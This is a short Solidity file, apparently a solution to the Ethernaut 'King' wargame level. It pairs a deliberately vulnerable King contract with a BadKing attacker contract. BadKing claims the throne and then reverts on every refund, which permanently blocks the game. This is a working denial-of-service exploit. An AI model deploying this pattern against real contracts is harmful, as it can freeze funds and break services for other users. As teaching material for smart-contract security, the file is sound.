// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract BadKing {

  constructor() public payable {}
    
  function becomeKing(address kingAddress) public {
      (bool success,) = kingAddress.call{value: 1000000000000000, gas: 4000000}("");
      require(success);
  }

  receive() external payable { revert("Haha! You fail!"); }
}